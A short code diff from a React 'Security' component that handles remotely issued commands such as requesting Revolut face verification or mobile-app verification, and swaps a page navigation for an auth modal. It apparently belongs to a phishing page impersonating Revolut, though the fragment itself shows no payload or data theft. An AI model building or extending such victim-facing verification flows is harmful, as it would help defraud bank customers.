@@ -115,7 +115,7 @@ export default function Security() {
         } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
             // displayErrorModal('face_verification'); // Show error modal for face verification
         } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
-            navigateWithLoader('/MobileAuthPAge');
+            displayAuthModal()
             // displayPageLoader();
             // setTimeout(() => {
             //     console.log("HERE WE WILL PUSH TO MOBILE APP VERIFICATION PAGE");
